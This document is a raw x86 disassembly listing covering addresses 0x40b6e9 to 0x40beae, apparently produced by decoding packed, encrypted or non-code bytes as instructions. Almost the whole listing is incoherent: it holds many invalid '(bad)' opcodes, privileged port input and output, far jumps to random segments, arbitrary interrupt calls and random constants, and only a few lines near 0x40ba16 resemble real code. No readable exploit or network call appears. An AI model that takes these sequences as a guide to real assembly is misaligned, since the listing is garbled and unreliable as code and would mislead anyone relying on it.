  40b6e9:	jo     0x40b70f
  40b6eb:	mov    ds:0xcdb82053,eax
  40b6f0:	add    edi,esp
  40b6f2:	sbb    al,0x84
  40b6f4:	push   eax
  40b6f5:	sbb    al,dl
  40b6f7:	je     0x40b6e9
  40b6f9:	cwde   
  40b6fa:	lds    esp,FWORD PTR [edx-0x694758c8]
  40b700:	cmp    DWORD PTR [ebp-0x4c],0x2d
  40b704:	mul    DWORD PTR [eax-0x4f81a92b]
  40b70a:	enter  0xf605,0x77
  40b70e:	jecxz  0x40b731
  40b710:	cmc    
  40b711:	xchg   edx,eax
  40b712:	xlat   BYTE PTR ds:[ebx]
  40b713:	mov    ch,0xed
  40b715:	mov    ebx,edi
  40b717:	aam    0xfd
  40b719:	jecxz  0x40b734
  40b71b:	xor    al,BYTE PTR [ebx+edx*2-0x5a7635ea]
  40b722:	push   edi
  40b723:	data16 cmp al,0x26
  40b726:	neg    ecx
  40b728:	push   ebx
  40b729:	add    DWORD PTR [esi+eiz*2-0x71da0392],ebp
  40b730:	mov    eax,ds:0xbcefc7ca
  40b735:	push   0xcaeb4324
  40b73a:	jns    0x40b6f1
  40b73c:	cmp    DWORD PTR [ecx+ecx*1-0x8fe533e],0x73a63a6a
  40b747:	ss mov cl,0x5
  40b74a:	dec    esi
  40b74b:	je     0x40b6f0
  40b74d:	cmc    
  40b74e:	cmp    BYTE PTR [ebp-0x68],dl
  40b751:	cli    
  40b752:	xlat   BYTE PTR ds:[ebx]
  40b753:	jo     0x40b72b
  40b755:	jg     0x40b793
  40b757:	fwait
  40b758:	lds    ecx,FWORD PTR [edi-0x6a]
  40b75b:	aad    0xd4
  40b75d:	add    eax,DWORD PTR [edx-0x29]
  40b760:	mov    eax,0xfe562a30
  40b765:	jge    0x40b715
  40b767:	adc    edx,DWORD PTR ds:0x479a567
  40b76d:	in     al,dx
  40b76e:	mov    edi,0xa7aa90c0
  40b773:	add    eax,0x7408779d
  40b778:	cmp    esi,DWORD PTR [edx-0x5f105c25]
  40b77e:	or     eax,0x5969ac0a
  40b783:	arpl   WORD PTR [ebx],si
  40b785:	xchg   esi,eax
  40b786:	test   ch,bl
  40b788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b789:	push   ss
  40b78a:	arpl   WORD PTR [eax-0x63],si
  40b78d:	adc    ah,bl
  40b78f:	loopne 0x40b78e
  40b791:	bound  ecx,QWORD PTR [eax-0x7a]
  40b794:	mov    esi,0x382db36e
  40b799:	pop    ebp
  40b79a:	ins    BYTE PTR es:[edi],dx
  40b79b:	test   eax,0x4f463c2d
  40b7a0:	or     ah,BYTE PTR [esp+eiz*2-0x1d50ba75]
  40b7a7:	test   al,0xd5
  40b7a9:	jne    0x40b745
  40b7ab:	in     al,dx
  40b7ac:	pop    es
  40b7ad:	lods   al,BYTE PTR ds:[esi]
  40b7ae:	sbb    eax,0xcb95848a
  40b7b3:	test   DWORD PTR [eax+0x74],edx
  40b7b6:	xor    eax,0x9b01c817
  40b7bb:	into   
  40b7bc:	fsub   st(6),st
  40b7be:	ja     0x40b742
  40b7c0:	jmp    FWORD PTR [edi+edx*1]
  40b7c3:	inc    eax
  40b7c4:	addr16 popf 
  40b7c6:	int    0x88
  40b7c8:	jmp    0x40b841
  40b7ca:	outs   dx,BYTE PTR ds:[esi]
  40b7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7cc:	retf   
  40b7cd:	call   0x4126:0x19b6e19b
  40b7d4:	pop    ebp
  40b7d5:	or     DWORD PTR [ebp+0x4f16326a],0x7c6a1e2a
  40b7df:	adc    eax,0xbaed9bad
  40b7e4:	mov    bh,0x58
  40b7e6:	xchg   edx,eax
  40b7e7:	icebp  
  40b7e8:	cwde   
  40b7e9:	pusha  
  40b7ea:	outs   dx,BYTE PTR ds:[esi]
  40b7eb:	std    
  40b7ec:	pop    es
  40b7ed:	mov    ebx,0xdd57cd5b
  40b7f2:	cdq    
  40b7f3:	pushf  
  40b7f4:	cmp    bl,BYTE PTR [ebx+0x2dbd1e99]
  40b7fa:	mov    eax,ds:0x2fc7e43d
  40b7ff:	pop    es
  40b800:	or     al,BYTE PTR [edi+0x18]
  40b803:	ret    
  40b804:	leave  
  40b805:	dec    ebx
  40b806:	cli    
  40b807:	(bad)  
  40b808:	cmpxchg BYTE PTR [ebp+0x21],al
  40b80c:	push   es
  40b80d:	pop    ss
  40b80e:	or     ch,bl
  40b810:	inc    esp
  40b811:	stc    
  40b812:	pop    ss
  40b813:	xchg   esi,eax
  40b814:	ret    0x90c0
  40b817:	js     0x40b87e
  40b819:	mov    ss,WORD PTR [eax-0x3e8d9edf]
  40b81f:	fs push ss
  40b821:	repz adc al,BYTE PTR [ecx]
  40b824:	and    DWORD PTR [ebx+0x4f],ebx
  40b827:	imul   esp,DWORD PTR [eax-0x50a76b2a],0x4a0620cf
  40b831:	dec    esi
  40b832:	ret    0x9ee
  40b835:	xchg   BYTE PTR cs:[edi-0x4029e97d],al
  40b83c:	out    dx,al
  40b83d:	mov    ds:0x90705f90,eax
  40b842:	sub    eax,0x650d16ab
  40b847:	adc    dl,BYTE PTR [esi+0x77e0a8ea]
  40b84d:	add    bl,BYTE PTR [esi+ebx*1]
  40b850:	inc    ecx
  40b851:	mov    esp,0xf57017d9
  40b856:	add    DWORD PTR [esi+0x4db967ab],0x4663f065
  40b860:	pop    ebx
  40b861:	add    BYTE PTR [edx],dl
  40b863:	add    BYTE PTR [ebp+0x1a1e6ec0],bh
  40b869:	shr    BYTE PTR [edi+ebp*4-0x5a7975ac],cl
  40b870:	or     esp,DWORD PTR [ebx-0x402ce0bc]
  40b876:	stc    
  40b877:	in     eax,0xf8
  40b879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b87a:	add    al,0x3d
  40b87c:	sub    eax,0xd4203674
  40b881:	call   0x2b50b62f
  40b886:	popa   
  40b887:	dec    eax
  40b888:	(bad)  
  40b889:	xchg   BYTE PTR [edi-0x7e2ebd65],dl
  40b88f:	mov    ds:0x80b8e336,al
  40b894:	stos   DWORD PTR es:[edi],eax
  40b895:	pop    eax
  40b896:	mov    al,ch
  40b898:	xchg   edx,eax
  40b899:	jno    0x40b8ca
  40b89b:	stos   DWORD PTR es:[edi],eax
  40b89c:	pop    ss
  40b89d:	dec    ebx
  40b89e:	hlt    
  40b89f:	clc    
  40b8a0:	push   ebx
  40b8a1:	xchg   esp,eax
  40b8a2:	shl    DWORD PTR [edx-0x6c83b6ba],1
  40b8a8:	sbb    ebx,0xfffffff1
  40b8ab:	shl    BYTE PTR [ebp+edi*1+0x72],cl
  40b8af:	mov    ebx,0xaafe1620
  40b8b4:	xchg   esp,eax
  40b8b5:	fisubr WORD PTR [edx+0x56]
  40b8b8:	inc    esp
  40b8b9:	fsubp  st(7),st
  40b8bb:	or     eax,0x21a449c5
  40b8c0:	(bad)  
  40b8c1:	xchg   esp,eax
  40b8c2:	dec    eax
  40b8c3:	mov    ds:0x98357912,eax
  40b8c8:	test   BYTE PTR [edi],bl
  40b8ca:	ret    
  40b8cb:	clc    
  40b8cc:	inc    edx
  40b8cd:	dec    ebp
  40b8ce:	call   0x131d1e35
  40b8d3:	or     eax,0x1f11ad0b
  40b8d8:	mov    bl,0x16
  40b8da:	mov    bh,0x37
  40b8dc:	test   bl,0x75
  40b8df:	retf   0x374c
  40b8e2:	test   al,0xa2
  40b8e4:	out    dx,eax
  40b8e5:	call   0xdf5dcaa4
  40b8ea:	repz daa 
  40b8ec:	ror    dl,cl
  40b8ee:	shr    DWORD PTR [ebp+0x3e],cl
  40b8f1:	add    dl,al
  40b8f3:	cmp    eax,0x23e04c9
  40b8f8:	pop    esp
  40b8f9:	jle    0x40b89d
  40b8fb:	mov    cl,0x3d
  40b8fd:	ret    
  40b8fe:	imul   ebx,DWORD PTR [edi+eax*4],0x5ca9f27b
  40b905:	add    eax,0x72fd2d34
  40b90a:	leave  
  40b90b:	push   ebp
  40b90c:	shl    BYTE PTR [edi-0x79],0xe7
  40b910:	addr16 dec ebp
  40b912:	mov    esp,0x84801d2e
  40b917:	repnz xlat BYTE PTR ds:[ebx]
  40b919:	sbb    DWORD PTR [ebx+0x5b8c5048],esp
  40b91f:	push   ecx
  40b920:	inc    edi
  40b921:	popa   
  40b922:	repz inc edx
  40b924:	data16 jp 0x40b8f8
  40b927:	adc    BYTE PTR ds:[eax-0x49],cl
  40b92b:	mov    DWORD PTR [esi+ebp*4],0xd30de193
  40b932:	inc    ebx
  40b933:	jp     0x40b8b6
  40b935:	mov    ecx,0x8fd654d9
  40b93a:	gs jl  0x40b92e
  40b93d:	imul   ebp,DWORD PTR [ecx-0x48cebb62],0xc9d77723
  40b947:	pop    esp
  40b948:	fsubr  st(1),st
  40b94a:	cwde   
  40b94b:	test   eax,0x38c30f9
  40b950:	inc    esp
  40b952:	cmp    DWORD PTR [eax+0x5dbab1ac],esp
  40b958:	xor    ah,BYTE PTR [ecx+0x6463de50]
  40b95e:	mov    ss,WORD PTR [edx+0x543c3184]
  40b964:	lahf   
  40b965:	dec    ebx
  40b966:	in     eax,dx
  40b967:	pop    ebx
  40b968:	icebp  
  40b969:	jbe    0x40b90b
  40b96b:	es dec ecx
  40b96d:	div    BYTE PTR [ebp-0x459d0673]
  40b973:	cld    
  40b974:	(bad)  
  40b975:	cmp    esp,esi
  40b977:	sub    bl,BYTE PTR [esi-0x47]
  40b97a:	mov    bl,0x80
  40b97c:	push   ds
  40b97d:	pop    ebp
  40b97e:	jns    0x40b9f0
  40b980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b981:	sbb    al,0x90
  40b983:	lods   al,BYTE PTR ds:[esi]
  40b984:	mov    ebx,0xab5a9edb
  40b989:	js     0x40b90c
  40b98b:	cmp    cl,BYTE PTR [edi]
  40b98d:	mov    es:0x417fce0b,eax
  40b993:	inc    eax
  40b994:	cmc    
  40b995:	test   BYTE PTR [edi-0x57],dh
  40b998:	jb     0x40b9dd
  40b99a:	in     eax,dx
  40b99b:	mov    ecx,0xb005f154
  40b9a0:	adc    ebp,ecx
  40b9a2:	(bad)  
  40b9a4:	mov    ?,WORD PTR [edx+0x4a]
  40b9a7:	dec    eax
  40b9a8:	dec    ecx
  40b9a9:	stc    
  40b9aa:	icebp  
  40b9ab:	js     0x40ba08
  40b9ad:	xchg   esp,eax
  40b9ae:	xchg   esp,eax
  40b9af:	xchg   esp,eax
  40b9b0:	and    eax,0xe54a8ed6
  40b9b5:	(bad)  
  40b9b7:	adc    BYTE PTR [edi+0x2b],bl
  40b9ba:	mov    bh,0x8b
  40b9bc:	pop    es
  40b9bd:	test   al,0x60
  40b9c0:	sahf   
  40b9c1:	loope  0x40b99e
  40b9c3:	sub    al,BYTE PTR [edi]
  40b9c5:	mov    al,ds:0x2cba6a74
  40b9ca:	jne    0x40b9cb
  40b9cc:	mov    ds:0x4aa7b33a,al
  40b9d1:	push   esp
  40b9d2:	pusha  
  40b9d3:	sub    bh,BYTE PTR [ecx]
  40b9d5:	lods   al,BYTE PTR ds:[esi]
  40b9d6:	jmp    0x180a:0xf6642922
  40b9dd:	or     al,0xe3
  40b9df:	or     al,0x8
  40b9e1:	jge    0x40b9fb
  40b9e3:	ins    BYTE PTR es:[edi],dx
  40b9e4:	pop    esi
  40b9e5:	push   ecx
  40b9e6:	aad    0x5f
  40b9e8:	out    0x86,al
  40b9ea:	out    dx,eax
  40b9eb:	mov    dh,0x4
  40b9ed:	rol    DWORD PTR [edx-0x29b4a00f],1
  40b9f3:	out    dx,al
  40b9f4:	mov    ds:0x6a61bc28,eax
  40b9f9:	mov    ?,eax
  40b9fb:	push   ds
  40b9fc:	xor    bl,BYTE PTR [ebx+eiz*4]
  40b9ff:	(bad)  
  40ba00:	mov    BYTE PTR [edi],dl
  40ba02:	stc    
  40ba03:	jo     0x40b9aa
  40ba05:	inc    ebp
  40ba06:	aas    
  40ba07:	sbb    eax,0x2484b7f4
  40ba0c:	add    eax,0xc3e4be6e
  40ba11:	inc    eax
  40ba12:	inc    edi
  40ba13:	dec    esi
  40ba14:	aam    0x66
  40ba16:	mov    ecx,DWORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	test   DWORD PTR [esi-0xe76ec8e],edi
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40b9c4
  40ba42:	ret    0x7c3c
  40ba45:	std    
  40ba46:	bound  ebx,QWORD PTR [ecx]
  40ba48:	mov    edx,0x871d6644
  40ba4d:	jg     0x40bab7
  40ba4f:	pop    es
  40ba50:	daa    
  40ba51:	xchg   edi,eax
  40ba52:	call   0x9946da20
  40ba57:	retf   0x6d8c
  40ba5a:	push   ds
  40ba5b:	cmp    ch,0x29
  40ba5e:	hlt    
  40ba5f:	dec    ecx
  40ba60:	jb     0x40ba8a
  40ba62:	push   esi
  40ba63:	(bad)  [edx]
  40ba65:	mov    ebp,0x5c98a0a7
  40ba6a:	mov    ecx,0x62ebdabe
  40ba6f:	push   ebp
  40ba70:	jmp    0xf570:0x8b8f0508
  40ba77:	ret    0x885
  40ba7a:	(bad)  
  40ba7b:	aad    0x1e
  40ba7d:	mov    eax,0xbfb56c05
  40ba82:	and    edx,ebp
  40ba84:	std    
  40ba85:	cmp    al,0x2
  40ba87:	or     al,0xe8
  40ba89:	push   ds
  40ba8a:	sbb    eax,0x98f52d9d
  40ba8f:	scas   eax,DWORD PTR es:[edi]
  40ba90:	cmp    ecx,DWORD PTR [edi+0x2181c0f6]
  40ba96:	leave  
  40ba97:	shr    DWORD PTR [ecx+0x4b],0xc
  40ba9b:	mov    ebx,0x78b3af40
  40baa0:	test   al,0x50
  40baa2:	aam    0x3e
  40baa4:	dec    esp
  40baa5:	add    bl,bh
  40baa7:	and    al,0xbb
  40baa9:	aaa    
  40baaa:	stc    
  40baab:	das    
  40baac:	call   0x76c8e6b4
  40bab1:	jle    0x40bada
  40bab3:	jmp    0x40baad
  40bab5:	pop    edi
  40bab6:	aas    
  40bab7:	loopne 0x40bae8
  40bab9:	mov    edx,0x11fe1a94
  40babe:	xor    eax,0x8c96bd3c
  40bac3:	or     BYTE PTR [esi-0x3f9c5c81],dh
  40bac9:	mov    edx,0xe27a15d1
  40bace:	rcr    DWORD PTR [edx-0x48a758fb],0xa5
  40bad5:	mov    al,0xa6
  40bad7:	clc    
  40bad8:	pusha  
  40bad9:	mov    WORD PTR [edi+ecx*8],?
  40badc:	and    eax,0x964c4b89
  40bae1:	cmp    bh,BYTE PTR ds:0x8f2ff01e
  40bae7:	pop    esp
  40bae8:	gs std 
  40baea:	pusha  
  40baeb:	in     eax,dx
  40baec:	and    DWORD PTR [edx+0x2a],esi
  40baef:	(bad)  
  40baf0:	in     eax,0x1
  40baf2:	int    0x83
  40baf4:	inc    edi
  40baf5:	jnp    0x40bb6a
  40baf7:	xchg   ebp,ebx
  40baf9:	fdiv   DWORD PTR [ebp-0x55f29154]
  40baff:	aad    0x58
  40bb01:	mov    bh,0xd9
  40bb03:	(bad)  
  40bb04:	xor    al,0xf7
  40bb06:	fs mov dl,bl
  40bb09:	push   cs
  40bb0a:	mov    ds:0x9914c526,eax
  40bb0f:	(bad)  
  40bb10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb11:	cld    
  40bb12:	cli    
  40bb13:	out    dx,al
  40bb14:	jmp    0x67a2:0xc8ba005d
  40bb1b:	or     dl,bl
  40bb1d:	jg     0x40bb59
  40bb1f:	adc    DWORD PTR [edi],edi
  40bb21:	mov    ebx,0x3f309436
  40bb26:	imul   ecx,DWORD PTR ss:0xdf71351,0x62
  40bb2e:	cmp    ebx,DWORD PTR [eax+0x28]
  40bb31:	mov    fs,WORD PTR [esi+0x4e]
  40bb34:	imul   edx,DWORD PTR [esi-0x35],0xffffff87
  40bb38:	push   edi
  40bb39:	ins    DWORD PTR es:[edi],dx
  40bb3a:	fist   WORD PTR [ebx-0x187df3fd]
  40bb40:	(bad)  
  40bb41:	repz cmp al,0xdb
  40bb44:	and    eax,0xd0c86d59
  40bb49:	cmp    al,0xe9
  40bb4b:	es jp  0x40bad5
  40bb4e:	jmp    0x4f80:0xbf6cd700
  40bb55:	dec    ebx
  40bb56:	pop    esp
  40bb57:	dec    esp
  40bb58:	aas    
  40bb59:	inc    ecx
  40bb5a:	dec    ebx
  40bb5b:	xchg   ecx,eax
  40bb5c:	inc    edi
  40bb5d:	mov    esi,0x1507f604
  40bb62:	push   ebp
  40bb63:	rol    DWORD PTR [edi+0x122e5984],0x96
  40bb6a:	xor    al,0x47
  40bb6c:	cld    
  40bb6d:	out    0x17,al
  40bb6f:	dec    edx
  40bb70:	ret    0x56bf
  40bb73:	lods   al,BYTE PTR ds:[esi]
  40bb74:	cmp    BYTE PTR [ecx],dh
  40bb76:	dec    eax
  40bb77:	cmp    DWORD PTR [ebp+eiz*1-0x3b],0x8e32e8dc
  40bb7f:	add    BYTE PTR [edi+ecx*1-0x2d],0xb4
  40bb84:	xchg   ebp,eax
  40bb85:	fwait
  40bb86:	lods   eax,DWORD PTR ds:[esi]
  40bb87:	iret   
  40bb88:	loope  0x40bbd3
  40bb8a:	adc    eax,0x8fbdf486
  40bb8f:	sbb    eax,0xd20230cf
  40bb94:	daa    
  40bb95:	jmp    0x40bb1d
  40bb97:	(bad)  
  40bb98:	push   ecx
  40bb99:	icebp  
  40bb9a:	mov    eax,ds:0x1216e53a
  40bb9f:	mov    DWORD PTR [ebx-0x2d2cd865],esi
  40bba5:	scas   eax,DWORD PTR es:[edi]
  40bba6:	jmp    0xfd59dfba
  40bbab:	push   eax
  40bbac:	adc    ah,ah
  40bbae:	iret   
  40bbaf:	mov    ds:0x92e830a9,al
  40bbb4:	fstp   DWORD PTR [ebx-0x118ccd8e]
  40bbba:	fist   DWORD PTR [ebp+0x16dbe469]
  40bbc0:	jns    0x40bbef
  40bbc2:	cmp    bl,BYTE PTR [ebx-0x739443b7]
  40bbc8:	sar    DWORD PTR [esi],cl
  40bbca:	pop    edx
  40bbcb:	outs   dx,DWORD PTR ds:[esi]
  40bbcc:	iret   
  40bbcd:	mov    bh,0x34
  40bbcf:	or     eax,0x9c59fbd9
  40bbd4:	mov    ebp,0xa5376771
  40bbd9:	ins    BYTE PTR es:[edi],dx
  40bbda:	loop   0x40bc12
  40bbdc:	dec    ebp
  40bbdd:	sbb    eax,0x99a26729
  40bbe2:	dec    edx
  40bbe3:	test   eax,0xfda65c64
  40bbe8:	mov    edi,0x1b13110d
  40bbed:	mov    BYTE PTR [edx+eax*2],al
  40bbf0:	mov    al,ds:0x14b4fd3e
  40bbf5:	retf   0x7b7b
  40bbf8:	ds xchg ebp,eax
  40bbfa:	imul   esp,ecx,0x28
  40bbfd:	push   ebx
  40bbfe:	rcl    cl,cl
  40bc00:	cmp    BYTE PTR [ebx-0x21e465dc],ch
  40bc06:	and    dl,BYTE PTR [ebp+0x67d6be15]
  40bc0c:	sub    bh,ch
  40bc0e:	sub    al,0xe6
  40bc10:	out    0xa7,eax
  40bc12:	add    eax,0x3603ef7a
  40bc17:	test   eax,0x1835ed0
  40bc1c:	mov    ebp,DWORD PTR [edx+0x0]
  40bc1f:	jl     0x40bbaf
  40bc21:	dec    eax
  40bc22:	inc    ebp
  40bc23:	sar    BYTE PTR [esi-0x22df18fb],cl
  40bc29:	pop    eax
  40bc2a:	mov    esi,0xc291eeff
  40bc30:	mov    edx,0x6a1a4a4a
  40bc35:	jp     0x40bc0f
  40bc37:	sbb    al,0x5a
  40bc39:	mov    dl,0xf1
  40bc3b:	mov    dl,0x6a
  40bc3d:	call   0xd796b907
  40bc42:	into   
  40bc43:	ins    BYTE PTR es:[edi],dx
  40bc44:	in     al,0x7
  40bc46:	jnp    0x40bc21
  40bc48:	outs   dx,DWORD PTR ds:[esi]
  40bc49:	inc    eax
  40bc4a:	sub    esp,DWORD PTR [ebx+0x67]
  40bc4d:	inc    ebx
  40bc4e:	fidivr DWORD PTR [ebp+0x57f00e6c]
  40bc54:	fcmove st,st(2)
  40bc56:	bound  esi,QWORD PTR [esi+0x72d600bf]
  40bc5c:	mov    al,ds:0x9d73dd2d
  40bc61:	out    0x37,eax
  40bc63:	je     0x40bcaa
  40bc65:	inc    esi
  40bc66:	push   edi
  40bc67:	dec    ebp
  40bc68:	imul   ebp,edi,0xff13b6fe
  40bc6e:	inc    esi
  40bc6f:	ss cmp eax,0xfc66e9c
  40bc75:	sti    
  40bc76:	enter  0xf41a,0xbb
  40bc7a:	pusha  
  40bc7b:	loope  0x40bca9
  40bc7d:	daa    
  40bc7e:	xchg   edx,eax
  40bc7f:	dec    edi
  40bc80:	iret   
  40bc81:	in     eax,dx
  40bc82:	dec    ecx
  40bc83:	cmp    al,BYTE PTR [ebx]
  40bc85:	iret   
  40bc86:	mov    dl,0x33
  40bc88:	fmul   QWORD PTR [ebp-0x670836cb]
  40bc8e:	dec    eax
  40bc8f:	mov    al,ds:0x9117634f
  40bc94:	adc    esi,DWORD PTR [ecx-0x6b]
  40bc97:	push   0x50f3cfc0
  40bc9c:	adc    eax,0xfec7e3b4
  40bca1:	cmp    eax,0x74155f85
  40bca6:	fisub  WORD PTR [edi]
  40bca8:	hlt    
  40bca9:	xchg   ecx,eax
  40bcaa:	xor    edx,DWORD PTR [esi-0x7642ecc2]
  40bcb0:	inc    ebp
  40bcb1:	adc    bh,BYTE PTR [edx-0x76]
  40bcb4:	test   DWORD PTR [ebx+0x52],eax
  40bcb7:	shl    DWORD PTR [ebp-0x2a],0xbb
  40bcbb:	(bad)  
  40bcbc:	xchg   ecx,eax
  40bcbd:	ror    DWORD PTR [esp+ebx*2],0x47
  40bcc1:	jnp    0x40bd30
  40bcc3:	xor    cl,BYTE PTR [edi+0x31]
  40bcc6:	mov    eax,ds:0x4a6cb416
  40bccb:	inc    esp
  40bccc:	daa    
  40bccd:	xor    ch,BYTE PTR [edx]
  40bccf:	xor    eax,0x6bd1398f
  40bcd4:	xchg   BYTE PTR [esp+eiz*4+0x163af634],bl
  40bcdb:	ins    DWORD PTR es:[edi],dx
  40bcdc:	mov    ds:0xabd31bcb,al
  40bce1:	add    edi,DWORD PTR [edi+0xa65c043]
  40bce7:	fnsave fs:[eax-0x7e]
  40bceb:	push   ebx
  40bcec:	outs   dx,DWORD PTR ds:[esi]
  40bced:	xlat   BYTE PTR ds:[ebx]
  40bcee:	lods   eax,DWORD PTR ds:[esi]
  40bcef:	push   0x6178daf5
  40bcf4:	pop    ds
  40bcf5:	ficomp WORD PTR [edx-0x29]
  40bcf8:	inc    ebx
  40bcf9:	fwait
  40bcfa:	(bad)  
  40bcfb:	push   ds
  40bcfc:	sbb    ebp,DWORD PTR [ecx+0x29]
  40bcff:	outs   dx,DWORD PTR ds:[esi]
  40bd00:	push   0x6
  40bd02:	fadd   st,st(1)
  40bd04:	mov    ds:0x7f971723,al
  40bd09:	or     edi,ebp
  40bd0b:	xlat   BYTE PTR ds:[ebx]
  40bd0c:	out    dx,eax
  40bd0d:	add    al,0x83
  40bd0f:	push   ebx
  40bd10:	xchg   edx,eax
  40bd11:	fwait
  40bd12:	mov    edi,0x9a0abdc5
  40bd17:	lods   al,BYTE PTR ds:[esi]
  40bd18:	dec    ecx
  40bd19:	jne    0x40bcc0
  40bd1b:	outs   dx,BYTE PTR ds:[esi]
  40bd1c:	cmp    dh,cl
  40bd1e:	in     eax,0xca
  40bd20:	and    al,0x9c
  40bd22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd23:	or     edi,ebx
  40bd25:	sub    DWORD PTR [ebx+0x1cd955f8],ebp
  40bd2b:	sbb    al,0x12
  40bd2d:	outs   dx,BYTE PTR ds:[esi]
  40bd2e:	out    dx,eax
  40bd2f:	or     ch,cl
  40bd31:	push   esp
  40bd32:	xchg   esi,eax
  40bd33:	int    0x61
  40bd35:	aas    
  40bd36:	mov    dl,BYTE PTR [edx-0x71]
  40bd39:	pop    edx
  40bd3a:	mov    ecx,0x9d2a2f58
  40bd3f:	push   edi
  40bd40:	sbb    eax,0x6739af22
  40bd45:	(bad)  
  40bd46:	pop    esi
  40bd47:	or     eax,0xfc9cd91f
  40bd4c:	add    cl,dh
  40bd4e:	mov    ds:0x86f831c2,al
  40bd53:	sub    eax,0x6788a07c
  40bd58:	outs   dx,DWORD PTR ds:[esi]
  40bd59:	push   ss
  40bd5a:	cmp    eax,0xec35f261
  40bd5f:	mov    ebp,0x808c32a
  40bd64:	or     BYTE PTR [eax-0x510311be],0xf3
  40bd6b:	in     al,0x31
  40bd6d:	add    DWORD PTR [eax],edx
  40bd6f:	dec    ebx
  40bd70:	aad    0x8b
  40bd72:	dec    ebp
  40bd73:	or     al,0x33
  40bd75:	mov    BYTE PTR [ebx],0xc0
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz adc edx,DWORD PTR [eax+0x75]
  40bd8e:	xchg   edi,eax
  40bd8f:	mov    ecx,0x2e7e7efc
  40bd94:	jge    0x40be14
  40bd96:	jle    0x40bd27
  40bd98:	jae    0x40bd6b
  40bd9a:	ror    BYTE PTR [edi],0xd8
  40bd9d:	or     BYTE PTR [eax-0x4563f07d],al
  40bda3:	es retf 
  40bda5:	add    BYTE PTR [ecx+0x2b3bb3c8],0x48
  40bdac:	into   
  40bdad:	aad    0x54
  40bdaf:	idiv   BYTE PTR [esi+0x492486a6]
  40bdb5:	or     eax,0x8fd17817
  40bdba:	fldenv [eax]
  40bdbc:	gs mov ebx,edx
  40bdbf:	or     al,0x33
  40bdc1:	sbb    BYTE PTR [ebp+0x6bc139],0xae
  40bdc8:	jp     0x40be43
  40bdca:	mov    edi,0xebacfb
  40bdcf:	sub    BYTE PTR [eax+0x7d9e4f8e],0x42
  40bdd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdd7:	pop    DWORD PTR [ecx-0x369a04dd]
  40bddd:	pop    ss
  40bdde:	retf   0x9569
  40bde1:	jmp    0x5d4:0xc811ee13
  40bde8:	out    dx,eax
  40bde9:	in     eax,dx
  40bdea:	out    0x6,eax
  40bdec:	arpl   WORD PTR [ebx+0x48],cx
  40bdef:	jp     0x40be5f
  40bdf1:	mov    BYTE PTR ds:0x5613f9f9,ch
  40bdf7:	inc    ebp
  40bdf8:	mov    ch,0x5
  40bdfa:	fs jp  0x40be20
  40bdfd:	sbb    DWORD PTR [ecx],0x66
  40be00:	add    eax,0xed550fd6
  40be05:	mov    bh,0xfc
  40be07:	sbb    ecx,DWORD PTR [edx+ebx*8]
  40be0a:	mov    ebp,0x37a3e010
  40be0f:	and    eax,0xe97203fc
  40be14:	inc    ebp
  40be15:	and    eax,0x69c1a8a6
  40be1a:	fiadd  WORD PTR [ebx-0x3e13ce5f]
  40be20:	inc    edx
  40be21:	sub    BYTE PTR [ebp-0x66],cl
  40be24:	pushf  
  40be25:	out    0x96,al
  40be27:	mov    BYTE PTR [eax-0x64c7235d],dh
  40be2d:	push   cs
  40be2e:	fist   DWORD PTR [edx-0x4f6acbf8]
  40be34:	leave  
  40be35:	aas    
  40be36:	lods   eax,DWORD PTR ds:[esi]
  40be37:	ror    edx,0x26
  40be3a:	sar    ch,0x90
  40be3d:	mov    bh,0xc7
  40be3f:	int3   
  40be40:	and    bl,BYTE PTR [edx-0x20]
  40be43:	sbb    al,ch
  40be45:	push   DWORD PTR [esi+0x405ba49d]
  40be4b:	mov    dh,bl
  40be4d:	lahf   
  40be4e:	ds ins BYTE PTR es:[edi],dx
  40be50:	int3   
  40be51:	xchg   BYTE PTR [esi],bl
  40be53:	mov    DWORD PTR [ebp+0x2b],0xcfd4aa47
  40be5a:	loope  0x40be2b
  40be5c:	retf   
  40be5d:	aaa    
  40be5e:	aaa    
  40be5f:	imul   esp,DWORD PTR [esi],0x61b8801d
  40be65:	iret   
  40be66:	push   cs
  40be67:	in     al,dx
  40be68:	test   eax,0xf0856ed8
  40be6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6e:	xor    BYTE PTR [eax+ebx*1-0x57],ah
  40be72:	xor    bh,bl
  40be74:	or     bh,BYTE PTR [edi-0x3deb5954]
  40be7a:	aaa    
  40be7b:	in     al,0x3d
  40be7d:	cli    
  40be7e:	cdq    
  40be7f:	mov    dl,0xa4
  40be81:	xchg   ebx,eax
  40be82:	inc    ecx
  40be83:	pop    es
  40be84:	mov    eax,0xfe423bcd
  40be89:	or     BYTE PTR [edx],0x6d
  40be8c:	and    DWORD PTR [esi-0x15c354d3],0xe8438568
  40be96:	push   eax
  40be97:	inc    esi
  40be98:	popf   
  40be99:	leave  
  40be9a:	stos   DWORD PTR es:[edi],eax
  40be9b:	(bad)  [edi-0x679ee18c]
  40bea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bea2:	and    al,0x48
  40bea4:	out    0xc2,al
  40bea6:	and    edx,DWORD PTR [ebx-0x10aec8b0]
  40beac:	xor    DWORD PTR [eax],eax
  40beae:	mov    ds:0xbe411de3,eax
